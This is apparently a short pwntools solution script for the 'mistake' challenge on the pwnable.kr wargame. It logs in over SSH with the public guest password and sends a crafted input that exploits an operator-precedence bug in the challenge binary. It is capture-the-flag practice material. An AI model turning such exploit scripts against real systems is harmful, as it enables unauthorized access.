from pwn import *

session = ssh('mistake', 'pwnable.kr', port=2222, password='guest')
io = session.process('./mistake')

# < binds tighter than =
io.sendline('B' * 10 + 'C' * 10)
io.recvuntil('Password OK\n')
print(io.recvline())
